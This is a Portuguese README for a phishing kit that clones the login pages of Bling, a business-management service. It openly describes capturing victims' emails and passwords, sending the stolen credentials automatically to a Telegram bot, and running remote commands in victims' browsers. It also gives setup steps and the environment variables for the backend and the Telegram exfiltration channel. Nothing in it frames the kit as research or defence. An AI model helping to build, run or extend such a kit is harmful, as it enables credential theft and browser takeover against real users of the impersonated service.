# Bling - Portal do Gestor

Clone do Bling focado em captura de dados, composto por duas páginas públicas de login (email + senha) e um painel administrativo.

## Funcionalidades

- **Páginas Públicas**: Login com email e senha (clone do Bling)
- **Painel Administrativo**: Acesso restrito para operadores com visualização de tentativas de login
- **Notificações Telegram**: Envio automático de credenciais capturadas
- **Comandos Remotos**: Execução de comandos no navegador do usuário

## Como rodar

### Backend (Python/FastAPI)
```bash
cd backend
pip install -r requirements.txt
cp .env.example .env  # preencha as variáveis
uvicorn server:app --reload
```

### Frontend (React)
```bash
cd frontend
npm install
npm start
```

## Variáveis de ambiente (backend/.env)

- `MONGO_URL`: URL de conexão com MongoDB
- `DB_NAME`: Nome do banco de dados
- `JWT_SECRET`: Segredo para tokens JWT
- `TELEGRAM_BOT_TOKEN`: Token do bot do Telegram
- `TELEGRAM_CHAT_ID`: ID do chat para notificações
- `CORS_ORIGINS`: Origens permitidas (ex: http://localhost:3000)
